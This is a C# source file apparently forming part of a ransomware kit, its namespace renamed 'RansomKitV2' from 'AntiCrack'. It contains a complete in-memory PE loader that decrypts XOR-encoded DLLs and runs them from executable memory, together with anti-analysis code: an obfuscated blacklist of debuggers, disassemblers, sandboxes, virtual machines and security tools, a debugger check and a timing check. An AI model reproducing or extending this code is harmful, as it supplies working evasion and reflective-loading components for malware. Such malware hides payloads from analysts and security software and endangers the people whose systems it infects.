using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RansomKitV2 // Changed from AntiCrack
{
    public static class SecureDllLoader
    {
        private static readonly byte[] _xorKey = Encoding.UTF8.GetBytes("YourSuperSecretSalt_ChangeMe_2026!");

        public static byte[] DecryptResource(byte[] encryptedData)
        {
            byte[] result = new byte[encryptedData.Length];
            for (int i = 0; i < encryptedData.Length; i++)
                result[i] = (byte)(encryptedData[i] ^ _xorKey[i % _xorKey.Length]);
            return result;
        }

        public static byte[] EncryptResource(byte[] rawData)
        {
            byte[] result = new byte[rawData.Length];
            for (int i = 0; i < rawData.Length; i++)
                result[i] = (byte)(rawData[i] ^ _xorKey[i % _xorKey.Length]);
            return result;
        }

        public static Assembly LoadManagedDLL(byte[] encryptedResource)
        {
            byte[] raw = DecryptResource(encryptedResource);
            return Assembly.Load(raw);
        }

        public static IntPtr LoadNativeDLL(byte[] encryptedResource)
        {
            byte[] raw = DecryptResource(encryptedResource);
            return ManualPELoader.LoadLibraryFromMemory(raw);
        }

        private static class ManualPELoader
        {
            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

            [DllImport("kernel32.dll", SetLastError = true, EntryPoint = "GetProcAddress")]
            private static extern IntPtr GetProcAddressOrdinal(IntPtr hModule, IntPtr lpProcName);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern IntPtr GetModuleHandle(string lpModuleName);

            [DllImport("kernel32.dll")]
            private static extern IntPtr LoadLibrary(string lpFileName);

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_DOS_HEADER { public ushort e_magic; public ushort e_cblp; public ushort e_cp; public ushort e_crlc; public ushort e_cparhdr; public ushort e_minalloc; public ushort e_maxalloc; public ushort e_ss; public ushort e_sp; public ushort e_csum; public ushort e_ip; public ushort e_cs; public ushort e_lfarlc; public ushort e_ovno; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public ushort[] e_res1; public ushort e_oemid; public ushort e_oeminfo; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)] public ushort[] e_res2; public int e_lfanew; }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_FILE_HEADER { public ushort Machine; public ushort NumberOfSections; public uint TimeDateStamp; public uint PointerToSymbolTable; public uint NumberOfSymbols; public ushort SizeOfOptionalHeader; public ushort Characteristics; }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_DATA_DIRECTORY { public uint VirtualAddress; public uint Size; }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_OPTIONAL_HEADER64 { public ushort Magic; public byte MajorLinkerVersion; public byte MinorLinkerVersion; public uint SizeOfCode; public uint SizeOfInitializedData; public uint SizeOfUninitializedData; public uint AddressOfEntryPoint; public uint BaseOfCode; public ulong ImageBase; public uint SectionAlignment; public uint FileAlignment; public ushort MajorOperatingSystemVersion; public ushort MinorOperatingSystemVersion; public ushort MajorImageVersion; public ushort MinorImageVersion; public ushort MajorSubsystemVersion; public ushort MinorSubsystemVersion; public uint Win32VersionValue; public uint SizeOfImage; public uint SizeOfHeaders; public uint CheckSum; public ushort Subsystem; public ushort DllCharacteristics; public ulong SizeOfStackReserve; public ulong SizeOfStackCommit; public ulong SizeOfHeapReserve; public ulong SizeOfHeapCommit; public uint LoaderFlags; public uint NumberOfRvaAndSizes; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)] public IMAGE_DATA_DIRECTORY[] DataDirectory; }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_OPTIONAL_HEADER32 { public ushort Magic; public byte MajorLinkerVersion; public byte MinorLinkerVersion; public uint SizeOfCode; public uint SizeOfInitializedData; public uint SizeOfUninitializedData; public uint AddressOfEntryPoint; public uint BaseOfCode; public uint BaseOfData; public uint ImageBase; public uint SectionAlignment; public uint FileAlignment; public ushort MajorOperatingSystemVersion; public ushort MinorOperatingSystemVersion; public ushort MajorImageVersion; public ushort MinorImageVersion; public ushort MajorSubsystemVersion; public ushort MinorSubsystemVersion; public uint Win32VersionValue; public uint SizeOfImage; public uint SizeOfHeaders; public uint CheckSum; public ushort Subsystem; public ushort DllCharacteristics; public uint SizeOfStackReserve; public uint SizeOfStackCommit; public uint SizeOfHeapReserve; public uint SizeOfHeapCommit; public uint LoaderFlags; public uint NumberOfRvaAndSizes; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)] public IMAGE_DATA_DIRECTORY[] DataDirectory; }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_SECTION_HEADER { [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public byte[] Name; public uint VirtualSize; public uint VirtualAddress; public uint SizeOfRawData; public uint PointerToRawData; public uint PointerToRelocations; public uint PointerToLinenumbers; public ushort NumberOfRelocations; public ushort NumberOfLinenumbers; public uint Characteristics; }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_IMPORT_DESCRIPTOR { public uint OriginalFirstThunk; public uint TimeDateStamp; public uint ForwarderChain; public uint Name; public uint FirstThunk; }

            [StructLayout(LayoutKind.Sequential)]
            private struct IMAGE_BASE_RELOCATION { public uint VirtualAddress; public uint SizeOfBlock; }

            private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D;
            private const uint IMAGE_NT_SIGNATURE = 0x00004550;
            private const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
            private const uint IMAGE_SCN_MEM_READ = 0x40000000;
            private const uint IMAGE_SCN_MEM_WRITE = 0x80000000;
            private const uint IMAGE_REL_BASED_DIR64 = 10;
            private const uint IMAGE_REL_BASED_HIGHLOW = 3;
            private const uint IMAGE_REL_BASED_HIGH = 1;
            private const uint IMAGE_REL_BASED_LOW = 2;
            private const uint IMAGE_REL_BASED_ABSOLUTE = 0;

            private delegate bool DllMain(IntPtr hinstDLL, uint fdwReason, IntPtr lpvReserved);
            private static IntPtr _imageBase;
            private static IntPtr _entryPoint;

            private static bool IsOrdinalImport(IntPtr thunk, bool is64Bit)
            {
                ulong val = (ulong)thunk.ToInt64();
                if (is64Bit)
                    return (val & 0x8000000000000000UL) != 0;
                else
                    return (val & 0x80000000UL) != 0;
            }

            public static IntPtr LoadLibraryFromMemory(byte[] dllBytes)
            {
                if (dllBytes.Length < 64) return IntPtr.Zero;

                GCHandle handle = GCHandle.Alloc(dllBytes, GCHandleType.Pinned);
                IntPtr ptr = handle.AddrOfPinnedObject();

                IMAGE_DOS_HEADER dos = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(ptr);
                if (dos.e_magic != IMAGE_DOS_SIGNATURE) { handle.Free(); return IntPtr.Zero; }

                IntPtr ntHeadersPtr = ptr + dos.e_lfanew;
                uint ntSig = (uint)Marshal.ReadInt32(ntHeadersPtr);
                if (ntSig != IMAGE_NT_SIGNATURE) { handle.Free(); return IntPtr.Zero; }

                IntPtr fileHeaderPtr = ntHeadersPtr + 4;
                IMAGE_FILE_HEADER fileHdr = Marshal.PtrToStructure<IMAGE_FILE_HEADER>(fileHeaderPtr);
                bool is64Bit = fileHdr.Machine == 0x8664;
                IntPtr optHeaderPtr = fileHeaderPtr + Marshal.SizeOf(fileHdr);

                uint imageSize, entryPointRva, sizeOfHeaders;
                IntPtr sectionHeaderPtr;

                if (is64Bit)
                {
                    IMAGE_OPTIONAL_HEADER64 opt = Marshal.PtrToStructure<IMAGE_OPTIONAL_HEADER64>(optHeaderPtr);
                    imageSize = opt.SizeOfImage;
                    entryPointRva = opt.AddressOfEntryPoint;
                    sizeOfHeaders = opt.SizeOfHeaders;
                    sectionHeaderPtr = optHeaderPtr + Marshal.SizeOf(opt);
                }
                else
                {
                    IMAGE_OPTIONAL_HEADER32 opt = Marshal.PtrToStructure<IMAGE_OPTIONAL_HEADER32>(optHeaderPtr);
                    imageSize = opt.SizeOfImage;
                    entryPointRva = opt.AddressOfEntryPoint;
                    sizeOfHeaders = opt.SizeOfHeaders;
                    sectionHeaderPtr = optHeaderPtr + Marshal.SizeOf(opt);
                }

                IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, imageSize, 0x3000, 0x40);
                if (baseAddr == IntPtr.Zero) { handle.Free(); return IntPtr.Zero; }

                Marshal.Copy(dllBytes, 0, baseAddr, (int)sizeOfHeaders);

                int sectionCount = fileHdr.NumberOfSections;
                for (int i = 0; i < sectionCount; i++)
                {
                    IMAGE_SECTION_HEADER sec = Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(sectionHeaderPtr + i * Marshal.SizeOf<IMAGE_SECTION_HEADER>());
                    if (sec.SizeOfRawData > 0)
                    {
                        IntPtr dest = baseAddr + (int)sec.VirtualAddress;
                        Marshal.Copy(dllBytes, (int)sec.PointerToRawData, dest, (int)sec.SizeOfRawData);
                    }
                }

                handle.Free();

                uint relocRva = 0, relocSize = 0;
                if (is64Bit)
                {
                    IMAGE_OPTIONAL_HEADER64 opt = Marshal.PtrToStructure<IMAGE_OPTIONAL_HEADER64>(optHeaderPtr);
                    relocRva = opt.DataDirectory[5].VirtualAddress;
                    relocSize = opt.DataDirectory[5].Size;
                }
                else
                {
                    IMAGE_OPTIONAL_HEADER32 opt = Marshal.PtrToStructure<IMAGE_OPTIONAL_HEADER32>(optHeaderPtr);
                    relocRva = opt.DataDirectory[5].VirtualAddress;
                    relocSize = opt.DataDirectory[5].Size;
                }

                if (relocRva != 0)
                {
                    long delta = (long)baseAddr - (long)(is64Bit ? Marshal.PtrToStructure<IMAGE_OPTIONAL_HEADER64>(optHeaderPtr).ImageBase : Marshal.PtrToStructure<IMAGE_OPTIONAL_HEADER32>(optHeaderPtr).ImageBase);

                    uint curRva = relocRva;
                    IntPtr relocPtr = baseAddr + (int)relocRva;
                    while (curRva < relocRva + relocSize)
                    {
                        IMAGE_BASE_RELOCATION reloc = Marshal.PtrToStructure<IMAGE_BASE_RELOCATION>(relocPtr);
                        curRva += reloc.SizeOfBlock;
                        if (reloc.SizeOfBlock == 0) break;

                        int entries = (int)((reloc.SizeOfBlock - 8) / 2);
                        IntPtr entryPtr = relocPtr + 8;
                        for (int j = 0; j < entries; j++)
                        {
                            ushort entry = (ushort)Marshal.ReadInt16(entryPtr);
                            entryPtr += 2;
                            uint type = (uint)(entry >> 12);
                            uint offset = (uint)(entry & 0x0FFF);
                            if (type == IMAGE_REL_BASED_ABSOLUTE) continue;

                            IntPtr patchAddr = baseAddr + (int)reloc.VirtualAddress + (int)offset;
                            if (is64Bit && type == IMAGE_REL_BASED_DIR64)
                            {
                                long orig = Marshal.ReadInt64(patchAddr);
                                Marshal.WriteInt64(patchAddr, orig + delta);
                            }
                            else if (!is64Bit && type == IMAGE_REL_BASED_HIGHLOW)
                            {
                                int orig = Marshal.ReadInt32(patchAddr);
                                Marshal.WriteInt32(patchAddr, (int)(orig + delta));
                            }
                        }
                        relocPtr = baseAddr + (int)curRva;
                    }
                }

                uint importRva = 0;
                if (is64Bit)
                {
                    IMAGE_OPTIONAL_HEADER64 opt = Marshal.PtrToStructure<IMAGE_OPTIONAL_HEADER64>(optHeaderPtr);
                    importRva = opt.DataDirectory[1].VirtualAddress;
                }
                else
                {
                    IMAGE_OPTIONAL_HEADER32 opt = Marshal.PtrToStructure<IMAGE_OPTIONAL_HEADER32>(optHeaderPtr);
                    importRva = opt.DataDirectory[1].VirtualAddress;
                }

                if (importRva != 0)
                {
                    IntPtr importDescPtr = baseAddr + (int)importRva;
                    while (true)
                    {
                        IMAGE_IMPORT_DESCRIPTOR desc = Marshal.PtrToStructure<IMAGE_IMPORT_DESCRIPTOR>(importDescPtr);
                        if (desc.Name == 0) break;

                        string moduleName = Marshal.PtrToStringAnsi(baseAddr + (int)desc.Name);
                        IntPtr hModule = GetModuleHandle(moduleName);
                        if (hModule == IntPtr.Zero) hModule = LoadLibrary(moduleName);
                        if (hModule == IntPtr.Zero) break;

                        IntPtr thunkRef = baseAddr + (int)desc.OriginalFirstThunk;
                        IntPtr funcRef = baseAddr + (int)desc.FirstThunk;
                        int ptrSize = IntPtr.Size;

                        while (true)
                        {
                            IntPtr thunk = Marshal.ReadIntPtr(thunkRef);
                            if (thunk == IntPtr.Zero) break;

                            if (IsOrdinalImport(thunk, is64Bit))
                            {
                                ushort ordinal = (ushort)(thunk.ToInt64() & 0xFFFFL);
                                IntPtr func = GetProcAddressOrdinal(hModule, (IntPtr)ordinal);
                                Marshal.WriteIntPtr(funcRef, func);
                            }
                            else
                            {
                                IntPtr importNamePtr = baseAddr + (int)thunk.ToInt64() + 2;
                                string funcName = Marshal.PtrToStringAnsi(importNamePtr);
                                IntPtr func = GetProcAddress(hModule, funcName);
                                Marshal.WriteIntPtr(funcRef, func);
                            }
                            thunkRef += ptrSize;
                            funcRef += ptrSize;
                        }
                        importDescPtr += Marshal.SizeOf(desc);
                    }
                }

                for (int i = 0; i < sectionCount; i++)
                {
                    IMAGE_SECTION_HEADER sec = Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(sectionHeaderPtr + i * Marshal.SizeOf<IMAGE_SECTION_HEADER>());
                    if (sec.SizeOfRawData == 0) continue;
                    IntPtr secAddr = baseAddr + (int)sec.VirtualAddress;
                    uint protect = 0;
                    if ((sec.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 && (sec.Characteristics & IMAGE_SCN_MEM_WRITE) != 0) protect = 0x40;
                    else if ((sec.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 && (sec.Characteristics & IMAGE_SCN_MEM_READ) != 0) protect = 0x20;
                    else if ((sec.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0) protect = 0x10;
                    else if ((sec.Characteristics & IMAGE_SCN_MEM_READ) != 0 && (sec.Characteristics & IMAGE_SCN_MEM_WRITE) != 0) protect = 0x04;
                    else if ((sec.Characteristics & IMAGE_SCN_MEM_READ) != 0) protect = 0x02;
                    else protect = 0x01;
                    VirtualProtect(secAddr, sec.VirtualSize, protect, out _);
                }

                _imageBase = baseAddr;
                _entryPoint = baseAddr + (int)entryPointRva;
                if (_entryPoint != IntPtr.Zero)
                {
                    DllMain dllMain = Marshal.GetDelegateForFunctionPointer<DllMain>(_entryPoint);
                    if (!dllMain(baseAddr, 1, IntPtr.Zero))
                    {
                        VirtualFree(baseAddr, 0, 0x8000);
                        return IntPtr.Zero;
                    }
                }
                return baseAddr;
            }

            public static void UnloadNativeDLL()
            {
                if (_entryPoint != IntPtr.Zero && _imageBase != IntPtr.Zero)
                {
                    DllMain dllMain = Marshal.GetDelegateForFunctionPointer<DllMain>(_entryPoint);
                    dllMain(_imageBase, 0, IntPtr.Zero);
                    VirtualFree(_imageBase, 0, 0x8000);
                    _imageBase = IntPtr.Zero;
                    _entryPoint = IntPtr.Zero;
                }
            }
        }
    }

    public static class MaliciousProcessScanner
    {
        private static readonly byte[] _encryptedProcessList = GenerateEncryptedList();

        private static byte[] GenerateEncryptedList()
        {
            string[] rawList = new string[]
            {
                "cheatengine", "cheatengine-x86_64", "ce.exe", "x64dbg", "x32dbg", "ollydbg",
                "ida", "ida64", "windbg", "gdb", "radare2", "cutter", "binaryninja", "imhex",
                "procmon", "procexp", "processhacker", "systeminformer", "apimonitor", "wireshark",
                "dumpcap", "tshark", "tcpdump", "nmap", "burpsuite", "fiddler", "charles",
                "dnspy", "dotpeek", "ilspy", "de4dot", "reflector", "justdecompile",
                "jd-gui", "jadx", "bytecode-viewer", "recaf", "ghidra", "hopper",
                "scylla", "strongod", "lordpe", "petools", "cff_explorer", "pe-bear",
                "themida", "vmprotect", "obsidium", "enigma", "armadillo", "upx",
                "reclass", "injector", "dllinjector", "extreme_injector", "xenos",
                "artmoney", "winhex", "hxd", "mimikatz", "procdump", "cobaltstrike",
                "metasploit", "msfconsole", "netcat", "teamviewer", "anydesk", "wpepro",
                "wemod", "flingtrainer", "goldberg_emulator", "steam_emu", "codex", "cpy",
                "pcileech", "leechcore", "dma_pci", "kmbox", "rivatuner", "rtss",
                "reshade", "autohotkey", "autoit3", "frida", "frida-server", "frida-gadget",
                "x96dbg", "ollyice", "idaw", "idag", "cdb", "ntsd", "gdbserver",
                "ettercap", "dsniff", "sqlmap", "wpscan", "acunetix", "nikto",
                "telerik-decompiler", "spire-decompiler", "fernflower", "cfr", "procyon",
                "vineflower", "exeinfo", "peid", "die", "protectid", "execryptor",
                "molebox", "boxedapp", "codevirtualizer", "winlicense", "zprotect",
                "safengine", "nspack", "pecompact", "aspack", "mpress", "winject",
                "injectomatic", "ghostinjector", "sharpinject", "gameconqueror",
                "scanmem", "memoryhacker", "tsearch", "mhs", "hexedit", "bless",
                "ghex", "hexinator", "010editor", "binwalk", "objdump", "dumpbin",
                "ndisasm", "udis86", "capstone", "sandboxie", "sbiesvc", "parallels",
                "qemu", "vmware", "vbox", "pslist", "pskill", "pssuspend", "handle",
                "pendmoves", "regmon", "filemon", "tcpview", "tcpvcon", "winobj",
                "debugview", "dbgview", "livekd", "secretsdump", "pwdump", "fgdump",
                "beacon", "teamserver", "aggressor", "nishang", "powercat", "pwncat",
                "socat", "plink", "putty", "ammyy", "radmin", "ultravnc", "tightvnc",
                "winsock", "winsniffer", "taskkill", "xenon", "carbon", "hyperion",
                "crypter", "titanhide", "plitch", "aurora_cheat", "megadev", "mrantifun",
                "loader", "keygen", "activator", "kmspico", "stand_cheat", "kiddion",
                "menyoo", "gtahax", "vac_bypass", "eac_bypass", "battleye_bypass",
                "afterburner", "fraps", "lua", "luainjector", "pythonw", "osrloader",
                "kmdmanager", "devcon", "tmac", "technitium", "macmakeup", "arpspoof",
                "macchanger", "detours", "mhook", "easyhook", "minhook", "polyhook", "nethook"
            };

            string csv = string.Join(",", rawList);
            byte[] rawBytes = Encoding.UTF8.GetBytes(csv);
            return SecureDllLoader.EncryptResource(rawBytes);
        }

        private static HashSet<string> _decryptedList;
        private static readonly object _lock = new object();

        private static HashSet<string> GetDecryptedList()
        {
            if (_decryptedList != null) return _decryptedList;
            lock (_lock)
            {
                if (_decryptedList != null) return _decryptedList;
                byte[] decrypted = SecureDllLoader.DecryptResource(_encryptedProcessList);
                string csv = Encoding.UTF8.GetString(decrypted);
                string[] items = csv.Split(new[] { ',' }, StringSplitOptions.RemoveEmptyEntries);
                _decryptedList = new HashSet<string>(items, StringComparer.OrdinalIgnoreCase);
                Array.Clear(decrypted, 0, decrypted.Length);
                return _decryptedList;
            }
        }

        public static bool IsMaliciousProcessPresent()
        {
            var blacklist = GetDecryptedList();
            var processes = Process.GetProcesses();
            foreach (var p in processes)
            {
                try
                {
                    if (blacklist.Contains(p.ProcessName))
                        return true;
                    if (!string.IsNullOrEmpty(p.MainModule?.FileName))
                    {
                        string fileName = Path.GetFileNameWithoutExtension(p.MainModule.FileName);
                        if (blacklist.Contains(fileName))
                            return true;
                    }
                }
                catch { }
            }
            return false;
        }

        public static bool IsDebuggerPresent()
        {
            if (Debugger.IsAttached) return true;
            return NativeMethods.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, out bool present) && present;
        }

        public static bool IsTimingSuspicious()
        {
            long t1 = Stopwatch.GetTimestamp();
            for (int i = 2; i < 1000000; i++)
            {
                bool prime = true;
                for (int j = 2; j * j <= i; j++)
                    if (i % j == 0) { prime = false; break; }
            }
            long t2 = Stopwatch.GetTimestamp();
            double elapsedMs = (t2 - t1) * 1000.0 / Stopwatch.Frequency;
            return elapsedMs > 500.0;
        }

        private static class NativeMethods
        {
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool isDebuggerPresent);
        }
    }
}